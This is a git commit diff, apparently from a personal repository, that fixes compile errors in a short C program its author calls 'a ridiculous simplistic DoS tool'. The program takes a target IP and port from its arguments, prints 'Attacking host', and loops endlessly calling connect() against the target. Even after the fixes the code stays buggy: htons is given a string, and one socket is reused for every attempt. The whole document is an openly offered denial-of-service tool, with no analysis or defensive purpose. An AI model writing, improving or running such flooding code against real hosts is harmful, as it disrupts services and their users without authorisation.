79cc6f5c82f013ae1ce336256c9ab2669f23114c
Dalmo Veras Neto <verasnt@protonmail.com>
2018-09-04 13:07:39 -0300

    a ridiculous simplistic DoS tool

--- c-c++/dosNoob.c
+++ c-c++/dosNoob.c
@@ -1,19 +1,19 @@
 #include <stdio.h>
 #include <netdb.h>
 
-int mai(int argc, char *argv[]){
+int main(int argc, char *argv[]){
 	struct sockaddr_in target;
 	int conn;
-	int socket = socket(AF_INET, SOCK_STREAM, 0);//ip protocol
+	int mysocket = socket(AF_INET, SOCK_STREAM, 0);//ip protocol
 	
 	target.sin_family = AF_INET;
-	terget.sin_port = htons(argv[2]);
+	target.sin_port = htons(argv[2]);
 	target.sin_addr.s_addr = inet_addr(argv[1]);
 
 //	conn = connect(socket, (struct socketaddr *)&target, sizeof target);
 	printf("Attacking host %s on port %s \n", argv[1], argv[2]);
-	while(1 = 1){
-		conn = connect(socket, (struct socketaddr *)&target, sizeof target);		
+	while(1){
+		conn = connect(mysocket, (struct sockaddr *)&target, sizeof target);		
 	}
 
 }
